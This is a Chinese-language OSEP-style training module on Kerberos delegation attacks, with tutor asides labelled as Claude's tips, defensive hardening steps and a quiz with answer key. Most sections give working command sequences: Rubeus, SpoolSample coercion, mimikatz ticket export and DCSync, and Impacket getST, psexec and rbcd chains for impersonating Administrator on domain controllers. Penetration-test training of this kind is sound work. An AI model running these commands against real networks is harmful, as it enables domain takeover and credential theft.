# Module 17: Kerberos 委派攻击

---

## 【Claude的学习建议】

> **Kerberos委派是OSEP考试的重点和难点！**
>
> 这章内容比较复杂，但非常重要。委派攻击是域渗透中获取域控权限的重要途径。
>
> **学习目标**：
> 1. 理解Kerberos认证的基本流程
> 2. 理解三种委派类型的区别
> 3. 掌握委派攻击的利用方法
>
> **给零基础同学的话**：
> 委派的概念可以这样理解：
> - 你（用户）去银行（服务A）办业务
> - 银行需要帮你去税务局（服务B）查资料
> - 银行"代表"你去税务局，这就是"委派"
> - 如果银行可以代表你去任何地方，就是"非约束委派"（很危险！）
>
> **为什么委派危险？**
> - 如果域管理员访问了一个有委派权限的服务器
> - 攻击者可以"借用"域管理员的身份
> - 然后以域管理员身份访问域控制器！

## Kerberos 委派详解

Kerberos 委派是 OSEP 考试的**重点内容**，理解委派机制对于域渗透至关重要。

## 一、Kerberos 认证回顾

> 【Claude的通俗解释】
>
> **Kerberos认证就像是"介绍信"系统**：
>
> ```
> 场景：你要去公司的各个部门办事
>
> 第1步：去前台（KDC）领取"通行证"（TGT）
> ├── 你：我是张三，这是我的工牌
> ├── 前台：验证通过，给你一张通行证
> └── 通行证上写着：张三可以在公司内活动
>
> 第2步：用通行证换取"部门许可"（ST）
> ├── 你：我要去财务部，这是我的通行证
> ├── 前台：好的，给你财务部的许可证
> └── 许可证上写着：张三可以进入财务部
>
> 第3步：进入部门
> ├── 你：这是我的财务部许可证
> ├── 财务部：验证通过，请进
> └── 你成功进入财务部
> ```
>
> **关键点**：
> - TGT = 通行证（证明你是谁）
> - ST = 部门许可证（证明你可以访问某个服务）
> - KDC = 前台（负责发放各种证件）

### 1.1 Kerberos 认证流程

```
Kerberos 认证三步曲:

1. AS-REQ/AS-REP (认证服务)
   用户 → KDC: 请求 TGT
   KDC → 用户: 返回 TGT

2. TGS-REQ/TGS-REP (票据授予服务)
   用户 → KDC: 使用 TGT 请求服务票据
   KDC → 用户: 返回服务票据 (ST)

3. AP-REQ/AP-REP (应用服务)
   用户 → 服务: 使用 ST 访问服务
   服务 → 用户: 授予访问
```

### 1.2 关键概念

| 概念 | 说明 |
|------|------|
| TGT | Ticket Granting Ticket，用于请求服务票据 |
| ST | Service Ticket，用于访问特定服务 |
| KDC | Key Distribution Center，密钥分发中心 |
| SPN | Service Principal Name，服务主体名称 |
| PAC | Privilege Attribute Certificate，权限属性证书 |

## 二、委派类型

> 【Claude的重点解释】
>
> **三种委派类型的区别（非常重要！）**
>
> ```
> 1. 非约束委派 = "全权代理"
>    ├── 服务可以代表你去任何地方
>    ├── 最危险！攻击者最喜欢
>    └── 例：银行可以代表你去任何机构
>
> 2. 约束委派 = "限定代理"
>    ├── 服务只能代表你去指定的地方
>    ├── 相对安全
>    └── 例：银行只能代表你去税务局
>
> 3. 基于资源的约束委派 (RBCD) = "反向授权"
>    ├── 由目标服务决定谁可以代表用户访问它
>    ├── Windows 2012引入
>    └── 例：税务局说"只有银行可以代表用户来找我"
> ```
>
> **攻击价值排序**：
> - 非约束委派 > RBCD > 约束委派
> - 非约束委派最容易利用，危害最大

### 2.1 三种委派类型

```
1. 非约束委派 (Unconstrained Delegation)
   - 服务可以代表用户访问任何服务
   - 最危险的委派类型

2. 约束委派 (Constrained Delegation)
   - 服务只能代表用户访问指定的服务
   - 相对安全

3. 基于资源的约束委派 (Resource-Based Constrained Delegation, RBCD)
   - 由目标资源控制谁可以委派
   - Windows Server 2012 引入
```

### 2.2 委派标志

```powershell
# 用户账户控制标志
TRUSTED_FOR_DELEGATION = 0x80000        # 非约束委派
TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000  # 协议转换

# msDS-AllowedToDelegateTo
# 存储约束委派的目标服务

# msDS-AllowedToActOnBehalfOfOtherIdentity
# 存储 RBCD 配置
```

## 三、非约束委派攻击

### 3.1 非约束委派原理

```
非约束委派流程:

1. 用户访问配置了非约束委派的服务
2. 用户的 TGT 被发送到服务
3. 服务可以使用用户的 TGT 访问任何服务
4. 如果域管理员访问了该服务，攻击者可以获取其 TGT
```

### 3.2 枚举非约束委派

```powershell
# 使用 PowerView
Import-Module .\PowerView.ps1

# 查找配置了非约束委派的计算机
Get-DomainComputer -Unconstrained

# 查找配置了非约束委派的用户
Get-DomainUser -TrustedToAuth

# 使用 AD 模块
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedForDelegation -eq $true}
```

### 3.3 利用非约束委派

```powershell
# 场景: 我们控制了一台配置了非约束委派的服务器

# 方法 1: 等待高权限用户访问
# 使用 Rubeus 监控 TGT
Rubeus.exe monitor /interval:5 /filteruser:Administrator

# 方法 2: 强制域控制器认证 (Printer Bug)
# 使用 SpoolSample 或 PetitPotam
SpoolSample.exe DC01.corp.com YOURSERVER.corp.com

# 捕获 TGT 后，使用 Pass-the-Ticket
Rubeus.exe ptt /ticket:base64_ticket

# 或者导出票据
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticket.kirbi
```

### 3.4 Printer Bug (打印机漏洞)

```powershell
# Printer Bug 利用 MS-RPRN 协议强制目标认证

# 使用 SpoolSample
SpoolSample.exe <目标> <监听服务器>

# 使用 Rubeus 捕获票据
Rubeus.exe monitor /interval:5

# 示例
SpoolSample.exe DC01.corp.com WEB01.corp.com
# DC01 会向 WEB01 发送认证请求
# 如果 WEB01 配置了非约束委派，会收到 DC01$ 的 TGT
```

## 四、约束委派攻击

### 4.1 约束委派原理

```
约束委派流程 (S4U):

S4U2Self:
1. 服务代表用户请求自己的服务票据
2. 不需要用户的密码或 TGT

S4U2Proxy:
1. 服务使用 S4U2Self 获得的票据
2. 请求目标服务的票据
3. 只能访问 msDS-AllowedToDelegateTo 中指定的服务
```

### 4.2 枚举约束委派

```powershell
# 使用 PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# 查看允许委派的服务
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# 使用 AD 模块
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

### 4.3 利用约束委派

```powershell
# 场景: svc_sql 用户配置了约束委派到 DC01 的 CIFS 服务
# msDS-AllowedToDelegateTo: cifs/DC01.corp.com

# 方法 1: 使用 Rubeus
# 需要 svc_sql 的密码或哈希

# 获取 svc_sql 的 TGT
Rubeus.exe asktgt /user:svc_sql /password:Password123! /domain:corp.com

# 执行 S4U 攻击
Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/DC01.corp.com /ptt

# 方法 2: 使用 Impacket
# getST.py
python getST.py -spn cifs/DC01.corp.com -impersonate Administrator corp.com/svc_sql:Password123!

# 使用票据
export KRB5CCNAME=Administrator.ccache
python psexec.py -k -no-pass corp.com/Administrator@DC01.corp.com
```

### 4.4 替代服务攻击

```powershell
# 约束委派的一个特性: 可以请求同一主机的其他服务
# 例如: 配置了 cifs/DC01，也可以请求 ldap/DC01, http/DC01 等

# 请求 LDAP 服务票据 (用于 DCSync)
Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/DC01.corp.com /altservice:ldap /ptt

# 然后执行 DCSync
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
```

### 4.5 使用 Impacket 进行约束委派攻击

```bash
# 使用 getST.py 获取服务票据
# 需要知道配置了约束委派的账户的密码或哈希

# 使用密码
python getST.py -spn cifs/DC01.corp.com -impersonate Administrator corp.com/svc_sql:Password123!

# 使用NTLM哈希
python getST.py -spn cifs/DC01.corp.com -impersonate Administrator -hashes :NTLM_HASH corp.com/svc_sql

# 使用AES密钥
python getST.py -spn cifs/DC01.corp.com -impersonate Administrator -aesKey AES_KEY corp.com/svc_sql

# 设置票据环境变量
export KRB5CCNAME=Administrator.ccache

# 使用票据执行命令
python psexec.py -k -no-pass corp.com/Administrator@DC01.corp.com
python smbexec.py -k -no-pass corp.com/Administrator@DC01.corp.com
python wmiexec.py -k -no-pass corp.com/Administrator@DC01.corp.com
```

### 4.6 约束委派攻击完整流程

```bash
# 1. 枚举约束委派
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# 2. 获取配置了约束委派的账户凭证
# 可以通过Mimikatz、LSASS转储等方式

# 3. 使用Impacket获取票据
python getST.py -spn cifs/target.corp.com -impersonate Administrator corp.com/svc_account:Password!

# 4. 设置票据
export KRB5CCNAME=Administrator.ccache

# 5. 使用票据访问目标
python psexec.py -k -no-pass corp.com/Administrator@target.corp.com
```

## 五、基于资源的约束委派 (RBCD)

### 5.1 RBCD 原理

```
RBCD 与传统约束委派的区别:

传统约束委派:
- 在服务账户上配置 (msDS-AllowedToDelegateTo)
- 需要域管理员权限配置

RBCD:
- 在目标资源上配置 (msDS-AllowedToActOnBehalfOfOtherIdentity)
- 只需要对目标资源有写权限
- 更容易被滥用
```

### 5.2 RBCD 攻击条件

1. 对目标计算机有写权限 (GenericAll, GenericWrite, WriteProperty)
2. 控制一个具有 SPN 的账户 (通常是计算机账户)

### 5.3 利用 RBCD

```powershell
# 步骤 1: 创建计算机账户 (如果没有)
# 默认情况下，域用户可以创建最多 10 个计算机账户

# 使用 PowerMad
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 或使用 Impacket
python addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Password123!' corp.com/user:password

# 步骤 2: 获取新计算机账户的 SID
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -ExpandProperty objectsid

# 步骤 3: 配置 RBCD
# 创建安全描述符
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# 设置 msDS-AllowedToActOnBehalfOfOtherIdentity
Set-DomainObject -Identity TARGET_COMPUTER -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# 步骤 4: 执行 S4U 攻击
# 计算 FAKE01$ 的哈希
Rubeus.exe hash /password:Password123!

# 获取票据
Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET_COMPUTER.corp.com /ptt

# 步骤 5: 访问目标
dir \\TARGET_COMPUTER\c$
```

### 5.4 使用 Impacket 进行 RBCD 攻击

```bash
# 配置 RBCD
python rbcd.py -delegate-to 'TARGET_COMPUTER$' -delegate-from 'FAKE01$' -action write corp.com/user:password

# 获取票据
python getST.py -spn cifs/TARGET_COMPUTER.corp.com -impersonate Administrator corp.com/'FAKE01$':Password123!

# 使用票据
export KRB5CCNAME=Administrator.ccache
python psexec.py -k -no-pass corp.com/Administrator@TARGET_COMPUTER.corp.com
```

### 5.5 RBCD攻击完整流程 (Impacket)

```bash
# 1. 创建计算机账户
python addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Password123!' corp.com/user:password

# 2. 配置RBCD (需要对目标有写权限)
python rbcd.py -delegate-to 'TARGET$' -delegate-from 'FAKE01$' -action write corp.com/user:password

# 3. 获取服务票据
python getST.py -spn cifs/TARGET.corp.com -impersonate Administrator corp.com/'FAKE01$':Password123!

# 4. 使用票据
export KRB5CCNAME=Administrator.ccache
python psexec.py -k -no-pass corp.com/Administrator@TARGET.corp.com

# 清理 (可选)
python rbcd.py -delegate-to 'TARGET$' -delegate-from 'FAKE01$' -action flush corp.com/user:password
```

## 六、委派攻击总结

### 6.1 攻击对比

| 类型 | 条件 | 危险程度 | 利用难度 |
|------|------|----------|----------|
| 非约束委派 | 控制配置了非约束委派的服务器 | ⭐⭐⭐⭐⭐ | 中 |
| 约束委派 | 获取配置了约束委派的账户凭据 | ⭐⭐⭐⭐ | 低 |
| RBCD | 对目标有写权限 + 控制一个计算机账户 | ⭐⭐⭐⭐ | 中 |

### 6.2 防御建议

```powershell
# 1. 限制非约束委派
# 只在必要时配置，优先使用约束委派

# 2. 保护高权限账户
# 将敏感账户添加到 "Protected Users" 组
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"

# 3. 设置 "Account is sensitive and cannot be delegated"
Set-ADUser -Identity "Administrator" -AccountNotDelegated $true

# 4. 监控委派配置变更
# 审计事件 ID 4742 (计算机账户更改)

# 5. 限制计算机账户创建
# 修改 ms-DS-MachineAccountQuota 为 0
Set-ADDomain -Identity corp.com -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

## 七、章节测试

### 选择题

1. 非约束委派的主要风险是？
   - A) 服务可以访问任何服务
   - B) 用户的 TGT 会被发送到服务
   - C) 密码会被泄露
   - D) 服务会被禁用

2. S4U2Self 的作用是？
   - A) 获取用户的密码
   - B) 代表用户请求自己的服务票据
   - C) 修改用户权限
   - D) 创建新用户

3. RBCD 配置存储在哪个属性中？
   - A) msDS-AllowedToDelegateTo
   - B) msDS-AllowedToActOnBehalfOfOtherIdentity
   - C) servicePrincipalName
   - D) userAccountControl

4. 利用 RBCD 需要什么条件？
   - A) 域管理员权限
   - B) 对目标有写权限 + 控制一个计算机账户
   - C) 物理访问
   - D) 网络管理员权限

5. Printer Bug 利用的是什么协议？
   - A) SMB
   - B) LDAP
   - C) MS-RPRN
   - D) HTTP

### 实践题

1. 描述非约束委派攻击的完整流程。

2. 解释 RBCD 攻击为什么比传统约束委派更容易被滥用。

### 答案

**选择题**：1-B, 2-B, 3-B, 4-B, 5-C

**实践题参考答案**：

1. 非约束委派攻击流程：
   - 枚举配置了非约束委派的服务器
   - 获取该服务器的控制权
   - 使用 Printer Bug 或等待高权限用户访问
   - 捕获发送到服务器的 TGT
   - 使用 Pass-the-Ticket 冒充高权限用户
   - 访问域控制器或其他敏感资源

2. RBCD 更容易被滥用的原因：
   - 传统约束委派需要域管理员配置
   - RBCD 只需要对目标资源有写权限
   - 普通用户可以创建计算机账户
   - 很多情况下用户对某些计算机有写权限
   - 配置更改不需要重启服务
